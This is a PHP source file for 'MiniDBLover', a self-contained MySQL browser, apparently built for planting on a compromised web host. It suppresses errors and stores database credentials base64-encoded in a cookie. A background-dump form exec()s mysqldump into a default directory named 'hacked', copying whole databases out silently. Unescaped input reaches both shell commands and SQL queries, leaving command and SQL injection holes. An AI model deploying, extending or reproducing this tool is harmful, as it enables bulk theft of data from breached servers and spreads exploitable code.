<?php
@ini_set('display_errors', 0);
@error_reporting(0);
set_time_limit(0);

// Oturum Yönetimi (oturum2 Cookiesi)
if (isset($_POST['login'])) {
    $creds = base64_encode($_POST['h'].'||'.$_POST['u'].'||'.$_POST['p']);
    setcookie('oturum2', $creds, time() + 36000, "/");
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

if (isset($_GET['logout'])) {
    setcookie('oturum2', '', time() - 3600, "/");
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

$auth = false;
if (isset($_COOKIE['oturum2'])) {
    list($db_host, $db_user, $db_pass) = explode('||', base64_decode($_COOKIE['oturum2']));
    $conn = new mysqli($db_host, $db_user, $db_pass);
    if (!$conn->connect_error) $auth = true;
}

// Giriş Ekranı
if (!$auth): ?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <script src="https://cdn.tailwindcss.com"></script>
    <title>DBMS Login</title>
</head>
<body class="bg-slate-900 flex items-center justify-center h-screen">
    <div class="bg-slate-800 p-8 rounded-lg shadow-2xl w-96 border border-slate-700">
        <h2 class="text-emerald-400 text-2xl font-bold mb-6 text-center">MiniDBLover Login</h2>
        <form method="POST" class="space-y-4">
            <input type="text" name="h" placeholder="Host (localhost)" class="w-full p-2 rounded bg-slate-700 text-white outline-none border border-slate-600 focus:border-emerald-500">
            <input type="text" name="u" placeholder="Username" class="w-full p-2 rounded bg-slate-700 text-white outline-none border border-slate-600 focus:border-emerald-500">
            <input type="password" name="p" placeholder="Password" class="w-full p-2 rounded bg-slate-700 text-white outline-none border border-slate-600 focus:border-emerald-500">
            <button type="submit" name="login" class="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-bold py-2 rounded transition">Giriş Yap</button>
        </form>
    </div>
</body>
</html>
<?php exit; endif;

// Dashboard Mantığı
$db_list = [];
$res = $conn->query("SHOW DATABASES");
while($row = $res->fetch_array()) $db_list[] = $row[0];

if (isset($_POST['dump_action'])) {
    $path = rtrim($_POST['dump_path'], '/');
    $selected = $_POST['db_select'];
    $to_dump = ($selected === '*') ? $db_list : array_intersect_key($db_list, array_flip(explode(',', $selected)));
    
    foreach ($to_dump as $db) {
        $file = "$path/{$db}_" . date('His') . ".sql";
        $cmd = "nohup mysqldump -h$db_host -u$db_user -p$db_pass $db > $file 2>/dev/null &";
        exec($cmd);
    }
    $msg = "Arka plan işlemi başlatıldı.";
}

$cur_db = $_GET['db'] ?? '';
$cur_tbl = $_GET['tbl'] ?? '';
if ($cur_db) $conn->select_db($cur_db);
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <script src="https://cdn.tailwindcss.com"></script>
    <title>MiniDBLover Dashboard</title>
    <style>::-webkit-scrollbar{width:5px}::-webkit-scrollbar-thumb{background:#10b981}</style>
</head>
<body class="bg-slate-900 text-slate-300 font-sans">
    <nav class="bg-slate-800 border-b border-slate-700 p-4 flex justify-between items-center">
        <span class="text-emerald-400 font-bold text-xl">MiniDBLover <span class="text-xs font-normal text-slate-500">v2.0</span></span>
        <div class="flex items-center gap-4">
            <span class="text-slate-400 text-sm italic"><?php echo "$db_user@$db_host"; ?></span>
            <a href="?logout=1" class="text-red-400 hover:text-red-300 text-sm underline">Güvenli Çıkış</a>
        </div>
    </nav>

    <div class="flex h-[calc(100-70px)]">
        <aside class="w-64 bg-slate-800 p-4 overflow-y-auto border-r border-slate-700">
            <h3 class="text-slate-500 uppercase text-xs font-bold mb-4 tracking-widest">Databases</h3>
            <ul class="space-y-1">
                <?php foreach($db_list as $k => $db): ?>
                    <li>
                        <a href="?db=<?php echo $db; ?>" class="block p-2 rounded hover:bg-slate-700 transition <?php echo $cur_db==$db?'bg-emerald-900/30 text-emerald-400 border-l-2 border-emerald-500':'' ?>">
                            <span class="text-slate-500 mr-2 text-xs"><?php echo $k+1; ?></span><?php echo $db; ?>
                        </a>
                    </li>
                <?php endforeach; ?>
            </ul>
        </aside>

        <main class="flex-1 p-6 overflow-y-auto">
            <div class="grid grid-cols-1 lg:grid-cols-2 gap-6 mb-6">
                <div class="bg-slate-800 p-4 rounded-lg border border-slate-700 shadow-sm">
                    <h4 class="text-emerald-400 mb-4 font-bold">Quick Background Dump</h4>
                    <form method="POST" class="flex flex-col gap-3">
                        <input type="text" name="dump_path" value="/home/u136381340/hacked" class="bg-slate-900 p-2 rounded border border-slate-600 outline-none focus:border-emerald-500">
                        <input type="text" name="db_select" placeholder="IDler (örn: 1,4,5) veya *" class="bg-slate-900 p-2 rounded border border-slate-600 outline-none focus:border-emerald-500">
                        <button type="submit" name="dump_action" class="bg-emerald-600 hover:bg-emerald-700 text-white py-2 rounded">İşlemi Başlat</button>
                    </form>
                    <?php if(isset($msg)) echo "<p class='mt-2 text-emerald-500 text-sm'>$msg</p>"; ?>
                </div>

                <div class="bg-slate-800 p-4 rounded-lg border border-slate-700">
                    <h4 class="text-emerald-400 mb-4 font-bold">Custom SQL Query</h4>
                    <form method="POST" class="flex flex-col gap-3">
                        <textarea name="q" class="bg-slate-900 p-2 rounded h-20 border border-slate-600 outline-none focus:border-emerald-500 text-sm" placeholder="SELECT * FROM ..."></textarea>
                        <button class="bg-slate-700 hover:bg-slate-600 py-2 rounded">Çalıştır</button>
                    </form>
                </div>
            </div>

            <?php if($cur_db): ?>
                <div class="bg-slate-800 p-4 rounded-lg border border-slate-700 overflow-x-auto">
                    <h4 class="text-slate-400 mb-4 italic">Tables in <b class="text-emerald-400"><?php echo $cur_db; ?></b></h4>
                    <div class="flex flex-wrap gap-2 mb-6">
                        <?php $t_res = $conn->query("SHOW TABLES"); 
                        while($t = $t_res->fetch_array()): ?>
                            <a href="?db=<?php echo $cur_db; ?>&tbl=<?php echo $t[0]; ?>" class="px-3 py-1 bg-slate-700 hover:bg-emerald-600 rounded text-sm transition"><?php echo $t[0]; ?></a>
                        <?php endwhile; ?>
                    </div>

                    <?php if($cur_tbl): 
                        $data = $conn->query("SELECT * FROM $cur_tbl LIMIT 50");
                        if($data): ?>
                        <table class="w-full text-left text-sm border-collapse">
                            <thead>
                                <tr class="bg-slate-900 text-emerald-400 border-b border-slate-700">
                                    <?php while($f = $data->fetch_field()) echo "<th class='p-3'>{$f->name}</th>"; ?>
                                </tr>
                            </thead>
                            <tbody class="divide-y divide-slate-700">
                                <?php while($row = $data->fetch_assoc()): ?>
                                    <tr class="hover:bg-slate-750 transition">
                                        <?php foreach($row as $v) echo "<td class='p-3 max-w-xs truncate' title='".htmlspecialchars($v)."'>".htmlspecialchars($v)."</td>"; ?>
                                    </tr>
                                <?php endwhile; ?>
                            </tbody>
                        </table>
                        <?php endif; 
                    endif; ?>
                </div>
            <?php endif; ?>
        </main>
    </div>
</body>
</html>
